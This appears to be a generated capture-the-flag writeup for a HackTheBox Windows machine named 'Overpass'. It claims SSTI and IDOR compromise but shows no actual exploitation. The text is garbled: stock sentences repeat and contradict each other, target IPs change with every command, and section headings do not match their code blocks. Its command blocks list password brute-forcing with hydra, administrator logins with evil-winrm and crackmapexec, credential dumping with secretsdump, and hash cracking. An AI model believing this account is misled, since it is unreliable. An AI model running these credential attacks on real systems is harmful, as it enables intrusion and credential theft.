---
TitleSEO: "HackTheBox — Overpass (Medium Windows) | ZureFX"
TitlePost: "HackTheBox — Overpass (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Overpass. SSTI and IDOR to achieve medium compromise on Windows."
Keywords: "web, easy, offsec"
URL: "https://zurefx.github.io/writeups/htb-overpass-559.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-overpass-559/"
Date: "2024-11-28"
Tags: "Web, Easy, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-overpass-559"
Permalink: "/writeups/htb-overpass-559.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Overpass** is rated **Medium** on HackTheBox. It runs **Windows** and the IP address during this analysis was `10.103.142.150`.

### Objectives

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.41.74.35/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.66.56.217 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.66.216 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.33.114.65 -u administrator -p 'P@ssw0rd!'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions. Command injection was possible through unsanitized user input in the search functionality.

```bash
evil-winrm -i 10.87.186.111 -u administrator -p 'P@ssw0rd!'
```

Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities.

### Web Enumeration

The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.87.179.191 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.37.7.72
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.57.129.109/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.129.228 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

## Exploitation

### Vulnerability Identification

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

Key finding: **SSTI**.

The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.13.139.102 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p143,1433,995 10.82.173.19 -oN scan.txt
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.94.179.180/FUZZ
gobuster dir -u http://10.125.68.115/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.105.120.76 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.89.106.44 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.129.224.196 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.18.29.93/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

## Summary

### Tools Used

- `ffuf`
- `nmap`
- `chisel`
- `sqlmap`

### Key Takeaways

- SSTI
- IDOR
